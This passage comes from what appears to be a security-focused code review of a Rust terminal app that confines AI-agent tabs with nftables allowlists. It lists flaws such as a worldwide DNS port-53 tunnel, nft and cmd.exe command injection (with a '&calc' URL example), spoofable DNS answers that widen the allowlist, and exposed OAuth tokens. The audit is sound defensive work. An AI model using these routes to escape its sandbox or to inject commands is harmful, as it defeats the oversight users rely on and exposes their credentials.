breaks; main.rs:26 install_rustls_provider() runs unconditionally on every invocation including purely local subcommands (log, tasks, note), and its failure is swallowed inside (lib.rs:1090 let _ =), so a genuinely failed install still surfaces later as exactly the panic the comment at :21-26 says this prevents; main.rs:64-66 dispatch() returning true is handled by a bare return that exits 0 with no GUI and no message — the comment calls it unreachable, so if that contract ever changes the failure mode is a silent success; app.rs:6794 file logging is initialised inside app::run, i.e. after clap parsing, --check-crypto, dispatch and the single-instance-lock failure path, so nothing main.rs does is ever logged and the 'another instance is already running' exit at :79-86 leaves no trace in the log file; main.rs has no tests at all, and the flag->global->lock ordering here is precisely where the first finding lives — dispatch.rs:768-770 shows the author already knows the split-out-the-exit trick, it just was not applied to main

### `src/net_meter.rs`

6 findings; top: descendants() (net_meter.rs:115) has no visited set but its input is a racy non-atomic /proc scan, so a cycle grows the Vec unbounded (hang+OOM on the meter thread); roots are never checked live, and exited tabs linger until the user answers a dialog, so a recycled pid attributes a stranger's sockets to a tab; pub count_connections has ZERO callers - 3 of the 7 tests cover a function nothing runs while the shipped filter is duplicated inline at :150

### `src/net_nft.rs`

net_nft.rs:97-98 the CIDR-allowlist ruleset() accepts udp/tcp dport 53 to ANY destination, so a confined tab can reach any host on :53 worldwide — a ready-made DNS-tunnel exfil/C2 channel; domain_ruleset() scoped exactly this hole to the host nameservers and its doc (:200-203) claims 'arbitrary UDP-to-:53 exfil doesn't' work, but ruleset() was never updated, so plain allowlist tabs still have the hole the docs say is closed; net_nft.rs:190-193+295-301 apply_block/apply_domain/apply_meter return a #[must_use] bool but log NOTHING on failure (unlike apply(), :386-393) and headless.rs:584 uses it as  whose result only feeds an unused  — when the daemon IS privileged and nft rejects/misses the block ruleset, net_off_via_bwrap is false (:620 ) so the tab spawns with NO netns fallback and NO nft table: a tab the UI shows as net-off has full internet, with not one log line; same shape for apply_domain (a false there also short-circuits the resolver spawn, so a domain-allowlist tab silently runs unconfined); net_nft.rs:47-57 the doc claims collisions are impossible because tab ids are UUIDs, but table_name maps every non-alnum char to '_', so 'a/b', 'a-b' and 'a b' all collide on tabatelier_a_b — any non-UUID id (the CLI/API tab-id path, tests already pass 'a/b c') makes one tab's apply()-teardown delete another tab's confinement, and read_counters_all/counters_key mis-attribute bytes the same way; there is also no length cap, so a long id yields a name nft refuses (NFT_NAME_MAXLEN) and apply silently returns false; net_nft.rs:546-548 run_nft_stdin returns Err from write_all (EPIPE when nft exits early) without ever child.wait()ing — std Child's Drop does not reap, so every such failure leaks a zombie nft in a long-lived daemon; net_nft.rs:319-328+338-353 allow_element strips only '"' and '\\' and the comment says the domain is 'already validated against the allowlist', but net_policy::push_domain (:233-252) only trims/lowercases — an interior newline survives and add_allow_ips writes each element with writeln! into a script fed to root's , i.e. arbitrary nft statement injection for anyone who can set a tab's allowlist domains; net_nft.rs:348-352 the batch fallback re-forks one nft per element, so a batch that fails for a PERMISSION reason (not one bad element) reproduces exactly the 40-120-spawns-per-cycle storm the batch was added to kill, every refresh, forever; net_nft.rs:523-533 teardown still deletes '{table}_nat' although nothing has created a _nat table since the :53-redirect was ripped — a guaranteed-failing extra fork on every apply* and every tab exit; net_nft.rs:462-481 fold_rule_counter ASSIGNS (slot.0 = bytes) rather than accumulating, and every apply* tears the table down first, so counters restart at 0 on any policy change or respawn while headless.rs:1377 assigns tab.tx_bytes straight from it — displayed egress jumps backwards, and a second rule ever added to chain out would silently overwrite the total; net_nft.rs:96/174/235  in the confine chain means switching a tab open->net-off leaves every already-established connection alive: policy changes only apply to new flows, and nothing kills the conntrack entries; net_nft.rs:95/173  in every mode (incl. net-off) leaves a 'no internet' tab full access to every localhost service — the daemon API, databases, other tabs' dev servers

### `src/net_policy.rs`

net_policy.rs:15-17 the module doc names a 'local filtering CONNECT proxy (domains)' as one of the two live enforcement paths, but no such module exists in src/ and host_allowed (:257) and ip_allowed (:281) have ZERO production callers — only tests. The single live consumer is resolvable_domains() at net_resolver.rs:141 (pre-resolve to IPs, then nftables). So the entire domain-matching half of this security module, including the lookalike guard, is dead code behind a stale doc; net_policy.rs:291-298 + headless.rs:587 a wildcard-only allowlist is a SILENT TOTAL BLOCK: resolvable_domains filters out every non-apex entry, so a config of just *.example.com yields no resolvable names, yet headless.rs:587 gates on !allow_set.domains.is_empty() which is true — the resolver spawns, programs zero IPs, and the tab has no egress at all while the UI shows a populated allowlist. Wildcards are documented as supported at :196 but are a no-op under the only enforcement path that exists; net_policy.rs:258 the port strip is rsplit_once(':'), which mangles IPv6 literals — '2606:4700::1' becomes '2606:4700:' and '[::1]:443' becomes '[::1]', neither parses as IpAddr, so both fall through to DOMAIN matching and are always denied even though half of CLOUDFLARE_CIDRS is v6. Latent today (no caller) but the test at :385 only calls ip_allowed directly and never host_allowed with a v6 literal, so nothing would catch it when a caller returns; net_policy.rs:150+158 Cidr::parse silently masks non-canonical input instead of rejecting it: '192.168.1.5/8' is accepted as 192.0.0.0/8, so one mistyped prefix widens an allowlist from a single host to 16.7M addresses with no error — nftables and ip(8) reject non-canonical CIDRs specifically to catch this; net_policy.rs:179-185 mask_v4(0)/mask_v6(0) return an all-zero mask, so a '0.0.0.0/0' or '::/0' entry matches everything and silently converts allowlist mode into unrestricted while the tab still displays as restricted — a default route deserves an explicit rejection in a security control; net_policy.rs:217+226 unparseable CIDRs are silently skipped, and the doc's claim that 'the caller validates and reports those separately' is false — the only Cidr::parse calls outside this module are in net_nft.rs test code. An all-garbage cidr list produces an empty AllowSet indistinguishable from 'nothing configured'; net_policy.rs:197 vs :200 domains is pub while its parallel apex_ok is private, and external code already reads .domains directly (headless.rs:1678, api/tabs.rs:92) — any external push to that pub Vec desynchronises the two and makes host_allowed panic on the out-of-bounds apex_ok[i] at :269; net_policy.rs:267-274 a plain entry grants ALL subdomains and there is no way to allow an apex only, so allowlisting any shared host (s3.amazonaws.com, a pages host, a CDN) grants every tenant beneath it — a straightforward exfiltration channel. The doc at :193-196 and the tests only discuss the lookalike case and never state that arbitrary subdomains are granted; net_policy.rs:144+171 an IPv4-mapped IPv6 address parses as V6 and can never match a V4 CIDR (the catch-all arm returns false), so a dual-stack or AI_V4MAPPED resolution of an allowed v4 host is denied, while conversely a '::ffff:0:0/96' entry would allow all of IPv4 through the v6 arm; net_policy.rs:233-252 push_domain does no hostname validation and no IDN-to-punycode conversion — a bare TLD entry of 'com' allows every .com host, a pasted URL is stored verbatim and silently never matches, and a Unicode domain can never match the punycode the wire actually carries; net_policy.rs:81 the ClaudeCode preset allows only api.anthropic.com and the test at :400 asserts console.anthropic.com is DENIED — that is the OAuth/login host, so a tab under this preset cannot authenticate or refresh a token; net_policy.rs:285-298 the pre-resolve model enforces on IPs, so allowing one domain on a shared CDN address also allows every other site on that address, and the daemon's resolution can diverge from the tab's own (GeoDNS, rotating A records) leaving legitimately-allowed connections aimed at IPs that were never programmed

### `src/net_resolver.rs`

net_resolver.rs:221-226 + :204-218 + :262 THE DNS CLIENT VALIDATES NOTHING, and its answers are programmed directly into the tab's nftables allow-set: build_query hardcodes the transaction id to 0x0001 for EVERY query, forward() calls sock.recv() on an UNCONNECTED socket (no connect(), no recv_from source check), and extract_answer_ips never checks the QR bit, the id, or that the answer's NAME matches the question. So the only entropy an off-path attacker must beat is the ephemeral source port, and a single forged UDP datagram adds an arbitrary IP to @allow_dyn for that tab — which defeats allowlist mode entirely. This is the security control itself, not a cache; net_resolver.rs:146-155 one socket is reused for every domain in a cycle and for both the A and AAAA query (:191-197) with no correlation of any kind, so even with no attacker a late reply to domain A that arrives during domain B's 3 s window is attributed to B and programmed under B's comment — cross-domain IP contamination from ordinary packet reordering; net_resolver.rs:143+152+157 min_ttl starts at REFRESH_MAX_S and is only ever LOWERED, so when every lookup fails (DNS outage, socket bind failure) min_ttl stays 120 and the loop sleeps the MAXIMUM interval precisely when nothing works — the slowest possible recovery, exactly backwards; net_resolver.rs:158+166 elem_timeout is sleep_s + 60 and each element is programmed with ttl.max(elem_timeout), so a 30 s-TTL record stays allowed for at least 80 s after the DNS answer expired, and a long-TTL record programs an element that outlives any allowlist edit; nothing in this module ever REMOVES an element (add_allow_ips only adds), so IPs a domain has rotated away from stay reachable until their own timeout — on a recycled CDN address that is another tenant's site reachable from the sandbox; net_resolver.rs:141 domains is captured ONCE outside the loop, so the allowlist is frozen at spawn: adding or removing a domain requires tearing the tab's resolver down, and there is no code path that does; net_resolver.rs:105-111 the resolv.conf parser strips the literal prefix 'nameserver' with no word boundary and no whitespace/comment handling, then parses the whole trimmed remainder as an IpAddr — so the extremely common 'nameserver 1.2.3.4 # primary' and any indented line silently fail to parse. If that leaves the list empty the code falls back to CLOUDFLARE 1.1.1.1 (:113), which both leaks every allowlisted domain name to a third party and, because nameservers() also scopes the confine chain's :53 hole (:99-102), opens the firewall to the wrong host while the tab keeps querying the real one — breaking the 'daemon and tab see the same answer' invariant the module doc claims at :88-89; net_resolver.rs:146-150 if the UDP bind fails, resolve() returns empty for every domain of every cycle forever and NOTHING is logged anywhere — the tab silently ends up with zero allowed IPs and the operator has no signal; net_resolver.rs:223 the 1500-byte buffer is parsed without ever checking the TC (truncated) bit and there is no TCP fallback and no EDNS0, so a domain with many records silently contributes only the subset that fit and connections to the rest are dropped; net_resolver.rs:224 is a single recv with a 3 s timeout and no retry, so one lost UDP packet drops that domain from the cycle and, once its element timeout lapses, a legitimately-allowed domain becomes unreachable; net_resolver.rs:228-245 record() only overwrites ips when the new list is non-empty, so a domain that has STOPPED resolving keeps displaying its last-known IPs in the operator's DNS-entries view as allowed — the one diagnostic surface for debugging allowlist drops actively lies about what is programmed; the LOG_CAP eviction at :235-237 is unreachable in practice since the domain list is fixed at :141; net_resolver.rs:28 the module is cfg'd out of the GUI build entirely, so neither clippy --features gui nor its tests ever run in that configuration

### `src/pet.rs`

pet.rs:140-156+235-238 named-id capture (walk/fall/drag/scream/eat) happens BEFORE the `frames.is_empty() -> continue`, so a named animation with no <frame> children yields a def.start/eat/fall/grabbed id absent from `anims`; tick() then hits the `else { return }` at :362 (or the eating branch's silent None at :351) and the pet is frozen forever — respawn() at :327 re-sets the same dangling id, so nothing recovers it; pet.rs:871-874 PetOverlay::rand_u32 returns the raw LCG and callers take `% len` (:897 summon species, :926 grazer pick, :990 grass ledge) — LCG low bits have tiny periods (bit0 period 2), so with 2 or 4 installed pets/ledges the choice strictly alternates instead of being random (Pet::rand_100 :338 correctly uses >>24; this one does not); pet.rs:948-969 tab_ledge_canvas clears the shared ledge Vec only when `index == 0` paints — if tab 0 is ever culled/not painted (scrolled, zero tabs, reordered) every frame appends without clearing, so `ledges` grows unbounded (memory + O(n) surface scans per pet per step); pet.rs:892-902 summon() calls list_pets() on every click and list_pets :726 does read_to_string on every pet XML (~1 MB each) despite the doc at :709-710 claiming it 'reads only the name, not the whole document' — spawn_grazer :913 caches, summon does not, so each summon click does full blocking disk reads on the UI thread; pet.rs:338-341 rand_100 = (rng>>24)%100 is modulo-biased over 256 values: 0..=55 occur 3/256, 56..=99 occur 2/256, so every XML probability is inflated (WALK_STICK 82 fires ~86%, a probability=50 next fires ~54%) — animation weights don't match the eSheep data; pet.rs:365-377 tick subtracts at most 8*interval_ms but never clamps the remainder when the step cap trips, so with a short interval (parse allows down to 1.0 ms at :217) accum_ms grows ~192 ms per frame without bound and the pet runs permanently pinned at 8 steps/frame with an ever-growing f32 that eventually loses precision; pet.rs:661-669 current_tile does frame%tilesx / frame/tilesx with no bound against tilesx*tilesy — a frame id past the grid gives a row offset outside the PNG and the sprite renders blank, silently, with no validation at parse time; pet.rs:751-756 load_pet picks the asset dir by <id>.xml presence alone then requires <id>.png in that same dir, so a dir holding only the XML makes the load fail outright instead of falling through to the second dir that has both; pet.rs:1155-1187 the drag catcher only clears self.drag on its own mouse-up — a lost mouse-up (window blur/focus loss, pointer grab break) leaves dragging=true forever, permanently freezing that pet's physics with no timeout or escape path

### `src/platform/linux.rs`

linux.rs:20-26+39-45 XDG_STATE_HOME/XDG_CONFIG_HOME are taken verbatim from env::var, which returns Ok("") for a set-but-empty var — XDG_CONFIG_HOME= makes config_dir() return "" so preferences.json and the API master token resolve RELATIVE to the process cwd; the XDG spec says empty must be treated as unset, and this quietly moves secrets out of ~/.config; linux.rs:22+34+41+58 HOME-unset falls back to /tmp, so with no HOME (hardened systemd unit, `sudo -u tab-atelier` without -H) tabs.json/preferences.json/token land in world-writable /tmp where any local user can pre-create or symlink them — a silent fallback for paths holding auth material should be fatal or read the passwd db, not /tmp; linux.rs:33-36 config_base_dir() hardcodes $HOME/.local and ignores XDG entirely while its sibling state_base_dir() honours XDG_STATE_HOME — so setting XDG_STATE_HOME splits tabs.json from the per-tab state it indexes, and the two config_* functions return unrelated roots ($HOME/.local vs $HOME/.config) despite the near-identical names; linux.rs:111-122 the parent walk starts at focus.focus without special-casing the reserved values None(0)/PointerRoot(1), so with no window focused query_tree(0) fails and the user gets an opaque 'query_tree: BadWindow' instead of 'no focused window'; the loop also has no depth bound and only exits on parent==root||0, so a focus on a second screen's root subtree walks the whole chain; linux.rs:124-153 geometry is read from the WINDOW but get_image is issued against root at translated coords — a window extending past a screen edge (negative dst_x/dst_y or x+w>screen width, routine for maximised/off-screen windows) makes the rect out of bounds and X returns BadMatch, failing the whole capture instead of clamping to the screen; linux.rs:205-207 when x11rb::connect fails, grab_hotkeys returns a HotkeyHandle whose receiver was dropped, so every later update_keys/suspend/resume is a silently-swallowed `let _ = send()` — the caller has no way to learn hotkeys are dead; linux.rs:283 same failure mode at runtime: any poll_for_event error breaks the thread permanently with no log and no restart, hotkeys just stop working forever; linux.rs:271-282 the event loop busy-polls at 16ms (~62 wakeups/s) for the process lifetime even while suspended, purely because try_recv on the command channel cannot be combined with a blocking wait_for_event; linux.rs:212-217 the modifier masks hardcode NumLock==Mod2 rather than querying the modifier map, and omit ScrollLock — hotkeys silently fail on layouts that map numlock elsewhere; linux.rs:80-95 random_bytes calls std::process::exit(1) from library code, so a /dev/urandom failure while the API thread mints a share token kills the GUI mid-frame skipping every destructor and the tabs.json persist, and makes the path untestable; linux.rs:50-56 pictures_dir spawns xdg-user-dir synchronously (blocking whatever thread calls it) and never checks o.status.success(), trusting stdout of a failed process

### `src/platform/windows.rs`

windows.rs:95-105 REINSTATES the predictable-token hole that linux.rs:72-95 exists to document as removed — its comment says 'Mirror linux.rs's degraded fallback so we never hard-fail', but linux.rs has no such fallback any more: it exits(1) precisely because 'a predictable token is worse than a crash'. On Windows a BCryptGenRandom failure instead mints the API master token and per-tab share tokens from SystemTime nanos, brute-forceable by anyone who can estimate the host clock. Worse, seed.to_le_bytes() is a u128 whose top 8 bytes are always zero for any current timestamp and it is .cycle()d, so a 32-byte token is the same ~8 bytes of low-nanos repeated four times; the comment is stale and the behaviour is the vulnerability; windows.rs:136-143 and :158-168 pass an untrusted string to cmd.exe: Rust's Command quotes arguments for the CommandLineToArgvW convention, which cmd.exe does NOT follow, so a URL or path containing and-sign, pipe, caret, quote or a %VAR% is re-parsed by cmd's own parser — 'http://x/&calc' runs calc. std documents passing untrusted args through cmd.exe as unsafe (the CVE-2024-24576 class), and these URLs come from clicked OSC-8 links in terminal output, i.e. straight from agent-controlled text; windows.rs:39-51 env::var returns Ok(empty) for a set-but-empty variable, so APPDATA= makes config_dir() the RELATIVE path 'tab-atelier' and the signing key + relay secret are written next to whatever the process cwd happens to be; with USERPROFILE also unset, user_profile() falls back to temp_dir(), and under a service account that is C:\Windows\Temp, writable by every authenticated user — identity material must not have a silent fallback; windows.rs:59-68 config_base_dir() returns %APPDATA% and config_dir() returns %APPDATA%\tab-atelier, and the module doc says callers join APP_DIR to config_base_dir — so the two resolve to the SAME directory. On Linux they are deliberately distinct (~/.config vs ~/.local) with linux.rs:29-32 stating the separation is what stops a bad write to one from corrupting the other; that isolation silently collapses on Windows and tabs.json/preferences.json now share a directory with the TLS key and tokens; windows.rs:49-61 tabs.json, preferences.json AND (per the module doc) the signing key and relay secret all land in the ROAMING profile, so on a domain-joined machine private key material is copied to the profile share at every logoff — %APPDATA% is the wrong side of the roaming split for secrets; windows.rs:81-87 process_cwd always returns None and the doc claims callers treat that as 'unknown cwd', but api/files.rs turns a missing cwd into a hard 400 'tab has no known cwd' — so every file upload/download route is permanently broken on Windows rather than degraded; windows.rs:200-234 the whole test module is inside a Windows-only file, so none of it (including random_bytes_different_calls, which would fail outright if the nanos fallback ever engaged twice in one tick) ever runs in this project's Linux CI — the fallback path has zero coverage anywhere

### `src/power.rs`

power.rs:111-125+130-134 PrevState stores per-tab jiffies as a POSITIONAL Vec with no record of which pid each entry came from, so every sample diffs tab i against whatever tab happened to occupy slot i last time: closing a tab shifts all later tabs down one index and each is then compared against its neighbour's counter, producing a large spurious CPU spike (saturating_sub only hides the negative direction) whose share is also used to attribute watts; and when tabs are ADDED the zip silently truncates to the shorter list, so the new tabs get no entry at all and the results Vec is shorter than tab_pids — headless.rs:1642 indexes it positionally with watts.get(i), so from that moment every tab's power is attributed to the wrong tab and folded into the PERSISTED energy_wh accumulator at headless.rs:1643; nothing anywhere invalidates prev when the pid set changes; power.rs:100 total_delta is cur_total.saturating_sub(prev).max(1), so a transient /proc/stat read failure (total_cpu_jiffies returning 0) makes the denominator 1 and every tab's cpu_percent explodes to an astronomical value for that frame instead of the sample being skipped; the same happens after any pause long enough that prev is stale relative to the elapsed passed in; power.rs:101-104+131 when a single RAPL read fails the frame contributes 0.0 joules AND prev.energy_uj is stored as None, so the FOLLOWING frame also contributes 0.0 — two intervals of real energy vanish from a cumulative total with no counter and no log line; power.rs:118-122 each tab is charged frame_watts * its_cpu_share, i.e. a proportional slice of WHOLE-PACKAGE RAPL draw including the idle floor, uncore and every other process on the box; the per-tab shares do not sum to 1 and the baseline is charged to whoever happened to use CPU, which is a defensible heuristic but is documented nowhere and is integrated into a persisted watt-hour figure the GUI presents as measurement; power.rs:163-168 read_battery_percent uses ok()? INSIDE the per-battery loop, so a BAT directory whose capacity file is unreadable aborts the whole scan and returns None instead of trying the next battery — on a dual-battery machine one unreadable node hides the other; power.rs:179-215 the sampler thread is spawned detached with no shutdown signal and holds Arcs to the shared state, so it keeps walking every tab's /proc subtree through daemon shutdown until the process exits; power.rs:80 vs :242+:381 production calls PowerSensor::detect(false) while both PowerMonitor tests construct detect(true), so the tests exercise a different sensor configuration than anything that ships and first_sample_is_zero's watts.is_none() assertion only holds for the test one; power.rs:246 the unit test calls sample(&[1, 2], ...) — pid 1 — so sum_tree_jiffies walks the ENTIRE process tree of the machine inside cargo test, making a unit test's cost and duration depend on the host's process count; power.rs:388-389 second_sample_has_values asserts cpu_percent >= 0.0, which is tautological for a ratio of unsigned deltas and proves only that the call did not panic; and no test varies the pid list between samples, which is exactly the input that triggers the positional-misalignment bug above

### `src/pty_ring.rs`

pty_ring.rs:357-363 + :383-387 the truncation-gap contract the wire model documents at :48-50 is NOT IMPLEMENTED at the consumer end: base_offset() has zero production callers (only tests; it even carries #[allow(dead_code)]), while since() silently clamps with offset.max(self.base_offset) and returns a short stream. The two real consumers, api_ws.rs:802 and http3.rs:135, never compare against base_offset, so after any eviction a viewer receives bytes with a HOLE in them and xterm.js replays them as contiguous — the remote screen silently diverges from the terminal with no error and no resync; pty_ring.rs:316 + :79-86 + :413 a swallowed compression error corrupts the ring and then PANICS: enc.finish().unwrap_or_default() stores an EMPTY deflated blob while still counting raw_len = 128 KiB into cold_raw, so the offset space claims bytes that no longer exist; inflate() then does 'let _ = read_to_end' and returns a short Vec, and since() indexes &raw[skip..] with skip derived from the CLAIMED extent — index out of range, in the WS/HTTP serving path. The comments at :82-84 and :314 assert these operations cannot fail and the code then indexes on that assumption instead of checking; pty_ring.rs:469-471 PtyTap::read uses 'if let Ok(mut ring) = self.ring.lock()', the only lock site in the crate that does not recover with PoisonError::into_inner — so one panic anywhere under the ring lock (the since() panic above, or any WS pump) poisons it permanently and EVERY subsequent PTY read silently stops recording. The desktop keeps working because alacritty still gets the bytes, so the failure is invisible: only remote replay dies, forever, with nothing logged; the same silent degradation appears at app.rs:2139/:2191 where a poisoned lock reports zero viewers and the scrollback is dropped; pty_ring.rs:329-343 eviction discards whole 128 KiB cold chunks rather than draining byte-wise, so retained history jumps backwards in 128 KiB steps — combined with the dead gap detection above, a viewer can lose an entire chunk between two polls with no signal at all; pty_ring.rs:299+306-323 compact() deflates a 128 KiB chunk SYNCHRONOUSLY inside PtyTap::read on the PTY reader thread, so roughly every 32 reads each tab pays an inline compression stall in exactly the latency path this module instruments for typing lag at :457-462 — nothing measures it and there is no off-thread option; pty_ring.rs:383-421 a since(0) scrollback bootstrap inflates the entire cold section and builds one Vec of the whole 4 MiB window, per call, and FRAME_CACHE_MAX at :199 explicitly declines to cache anything that large — so every WS (re)connect pays a full inflate plus copy under the ring lock, and N simultaneously reconnecting viewers multiply both the CPU and the transient allocation with no throttle; pty_ring.rs:272-279 the frame_cache drop is the else-branch of '!data.is_empty() && viewer_count() > 0', which conflates 'nothing to flush' with 'nobody watching' — an EMPTY push while viewers are attached discards a frame the siblings could still have reused; pty_ring.rs:65 DEFAULT_CAPACITY_BYTES is a fixed 4 MiB per tab with no per-tab override and no relation to the tab's cgroup memory cap, so a 60-tab restore commits to up to 240 MiB of history budget that nothing in the resource-limit path accounts for; pty_ring.rs:319 raw_len is an unchecked 'as u32' cast of the chunk length — correct only because CHUNK_RAW happens to be 128 KiB, and it would silently truncate rather than fail if that constant ever grew; pty_ring.rs:463-468 the T2 trace logs up to 32 bytes of raw PTY output as a preview, so enabling the documented lag instrumentation writes terminal CONTENT into the log, which the surrounding comment describing it purely as timing instrumentation does not mention

### `src/relay.rs`

relay.rs:176-183 persist writes the temp file with `std::fs::write`, i.e. the process umask (typically 0644 world-readable), and only chmods 0600 AFTER the rename — so the OAuth access AND refresh tokens sit world-readable on disk for the duration of the write, and if the rename at :183 fails the .credentials.json.tmp file is left behind PERMANENTLY, still world-readable, still holding live credentials, with no cleanup on the error path; relay.rs:156-168 there is no lock around read→refresh→persist and the doc at :150-151 explicitly embraces that ('reads the credentials file each call … keeps the egress stateless') — but Anthropic ROTATES the refresh token, so two concurrent relayed requests that both see the token near expiry both call refresh(), and whichever persists second writes a blob whose refresh token the other call already invalidated: auth is bricked until the user re-logs in, and a Claude Code session issuing parallel requests makes this the normal case, not a rare one; relay.rs:165-167 the same bricking happens on a single request when persist() fails: refresh() has already rotated the token upstream (the old refresh token is now dead) and the fresh blob is DISCARDED with the Err — the next call reads the stale file and presents a refresh token upstream has revoked; the comment at :163-164 worries about a partial write while the actual failure mode is any persist error at all, and the fresh token is not returned, retained or retried; relay.rs:224 `now_ms() + body.expires_in * 1000` is unchecked u64 arithmetic on a value the upstream controls — an `expires_in` near u64::MAX panics in debug and wraps in release to an expires_at in the past, which then makes every subsequent call refresh again, rotating the refresh token on every request; relay.rs:119-123 now_ms() maps a pre-epoch clock to 0, which silently inverts both comparisons: at :160 `blob.expires_at > 0 + 60_000` is true for any real expiry so a genuinely expired token is used, and at :224 the computed expires_at lands near the epoch so the very next call refreshes again — a clock skew degrades into a refresh storm rather than an error; relay.rs:111-117 upstream() accepts TAB_ATELIER_RELAY_UPSTREAM (and set_upstream) with no scheme validation whatsoever, so an env var can point the egress — which attaches a live Claude OAuth bearer token to every forwarded request — at an arbitrary `http://` host and silently exfiltrate the credential in cleartext; there is no https-only check and no allowlist; relay.rs:91+112 both overrides are read with `.read().ok()`, so a POISONED RwLock silently falls back to the default: a panic anywhere while the lock is held makes set_credentials_path's test fixture revert to the real ~/.claude/.credentials.json, and the very next oauth_access_token() will read and possibly REFRESH (rotating) the developer's actual credentials from inside a test; relay.rs:138-145 relay_agent() constructs a brand-new ureq::Agent on every call, so each relayed request and each refresh gets a fresh connection pool and pays a new TLS handshake to api.anthropic.com — no keep-alive is possible across requests, on the path whose doc (:127-128) is otherwise carefully tuned for long streams; and with 'no global timeout' plus only a connect timeout, a half-open upstream that stops sending mid-stream holds the relay thread forever with no read timeout to break it; relay.rs:40-53 merge_beta imposes no bound on flag count or total length and dedups O(n²), and the result is forwarded upstream — a client-supplied anthropic-beta header of arbitrary size is echoed into the egress request with no cap; relay.rs:62-70+225-229 the `scopes` field is parsed and round-tripped but never validated, so a refresh that comes back without `user:inference` is persisted as good and only surfaces later as an opaque upstream 401

### `src/remote.rs`

11 findings: Activate posts to a route the daemon deleted (405); output/input addressed by stale remote_index though /tabs/by-id works -> bytes+keystrokes can hit the wrong tab; module doc claims cert pinning but code does disable_verification; sleep(backoff) up to 30s blocks Shutdown/input; missing X-Output-Length silently re-appends full scrollback every 250ms; malformed /tabs rows default to index 0/empty id; output errors unthrottled+unbounded mpsc; poll deadlines drift to zero-wait spin; Reconnecting.since restamped + Connecting never constructed; wrong REQUEST_TIMEOUT rationale; zero tests

### `src/schedule.rs`

schedule.rs:185-187 next_change_at maps the next LOCAL transition back through tz.from_local_datetime().earliest(), which returns None for a NONEXISTENT local time (DST spring-forward gap) — .earliest() only disambiguates the fall-back/Ambiguous case, so the comment at 181-184 claiming it handles 'even when the wall clock skipped over it' is factually inverted; a rule with a boundary inside the gap (Europe/Paris 02:00-02:59 on transition day, e.g. an overnight 'Mo-Fr 09:00-02:00') yields None; schedule.rs:223 verdict_now then treats next_change==None as 'valid forever' (is_none_or), so that thread's cached verdict FREEZES permanently at whatever is_open it had — the tab stays locked (or stays unlocked) indefinitely, and nothing distinguishes 'no further transitions' from 'conversion failed'; schedule.rs:457 the dst_spring_forward test discards the result (let _ = ...) so it cannot catch this; schedule.rs:40-42 PARSED_RULE_CACHE is an UNBOUNDED thread-local HashMap keyed by rule string — no cap and no eviction, unlike VERDICT_CACHE which is capped at 64 (line 236) with a comment acknowledging exactly this risk; every rule string ever seen (incl. schedules since deleted via POST /tabs/by-id/x/schedule) is retained for the life of each thread, ×N tokio blocking-pool threads since the caches are thread-local; schedule.rs:163-169 contradictory failure policy 5 lines apart: unparseable rule fails OPEN (return true) while RuleKind::Unknown fails CLOSED, yet the comment at 166-168 states 'fail closed on ambiguity'; schedule.rs:63-69 TabSchedule derives Deserialize with pub fields and NO validation hook, so only the API path (api/schedule.rs:44) goes through new() — a tabs.json with a bad tz silently degrades to UTC (line 126 unwrap_or(UTC)) and a bad rule silently degrades to always-open (line 163), both with zero log/warn, so a user's off-hours lock just stops working with no signal

### `src/screenshot.rs`

screenshot.rs:115-127 take_screenshot_tab CROPS THE WRONG END: it keeps img.data[..crop_h*stride], i.e. the FIRST crop_h rows. X11 returns rows top-first and the tab bar is at the TOP, so this keeps the tab bar and chops tab_bar_height rows off the BOTTOM of the terminal — the exact opposite of what the function is for. Removing a top bar needs the slice to start at tab_bar_height*src_stride (its own error string at :126, 'crop offset exceeds image data', hints an offset was meant). No test touches this path, which is why it survives; screenshot.rs:17-22 timestamp() has ONE-SECOND resolution and screenshot.rs:40 unconditionally remove_file's the destination first, so two captures of the same tab within the same second silently destroy the first — the UI reports 'Saved' both times and only one file exists. The remove+create_new pair is also a race in a shared screenshots dir (reachable when platform::linux's HOME fallback puts pictures_dir under /tmp): an attacker planting a symlink between the two calls turns the capture into an EEXIST failure; O_EXCL blocks the redirect the comment worries about, but the unconditional delete is real data loss on any name collision; screenshot.rs:61 the bytes-per-pixel probe is a GUESS from buffer length (bgra.len() >= w*h*4) and the true value is thrown away upstream — platform/linux.rs:155-159 passes reply.data raw and discards reply.depth. X11 Z_PIXMAP scanlines are padded to the server's scanline unit, so on any display that is not 32bpp-unpadded the assumed stride of w*bpp is wrong and every row shears diagonally; the same probe is written twice with DIFFERENT integer widths — u32 at :61 vs usize at :116 — so the two disagree for large images; screenshot.rs:27-32 all header arithmetic is u32 (row_padded*h, 54+pixel_data_size) with no checked/saturating math: it wraps silently in release, writing a bogus file_size into the BMP header for an oversized capture, and panics in debug; screenshot.rs:72-76 when the buffer is short the loop substitutes BLACK pixels instead of failing, so a truncated capture is written as a partly-black image and reported as a success; screenshot.rs:25+48-59 the writer assumes little-endian BGRA ordering (BMP 24-bit is BGR) without checking the X server's image-byte-order — red and blue come out swapped on an MSBFirst server; screenshot.rs:85-96 sanitize_filename uses Unicode is_alphanumeric and imposes NO length cap, and tab names are user-settable and unbounded, so a long or multi-byte name (its own test asserts CJK survives) overflows NAME_MAX and surfaces as a raw 'create ...: File name too long'; an empty name yields the double-dash 'tab-atelier--<ts>.bmp'; screenshot.rs:101+130 create_dir_all's error is discarded, so a mkdir failure is re-reported later as a confusing 'create <file>: No such file or directory' from write_bmp; screenshot.rs:20 unwrap_or_default on a pre-epoch clock makes timestamp() return '0' for every capture, collapsing all filenames onto one name that then overwrites itself

### `src/ssh_agent.rs`

ssh_agent.rs:50-55+87-90 the socket filename is crc32(tab_id) and the doc justifies it with "tab ids are UUIDs, so crc32 collisions are not a concern" — that reasoning is unsound (crc32 is 32-bit, so the birthday bound puts a collision around 65k tabs, and crc32 is trivially collidable by construction for any id an API caller ever gets to choose), and the consequence is the worst possible one for this module: AGENTS is keyed by tab_id, NOT by path, so the colliding tab finds no map entry, unconditionally unlinks the LIVE socket at :90 and binds its own agent there — tab A is left with SSH_AUTH_SOCK pointing at tab Bs agent, i.e. it silently acquires Bs SSH identities, which is exactly the isolation this module exists to provide; ssh_agent.rs:76-78 the reuse path is pure map-presence with no liveness check — if a tabs ssh-agent dies (OOM-kill, crash, a user kill), every later ensure keeps handing back the dead handle, so the tab spawns with an SSH_AUTH_SOCK pointing at nothing and every ssh/git operation in it fails until the tab is destroyed and recreated; ssh_agent.rs:110+169-177 when parse_agent_pid fails the pid is stored as 0 and teardown then SKIPS the kill, so the agent — a process holding the users DECRYPTED private keys in memory — leaks for the lifetime of the daemon with only its socket file removed, directly contradicting the "no orphans accumulate" claim at :18-20; ssh_agent.rs:169-177 teardown kills a bare 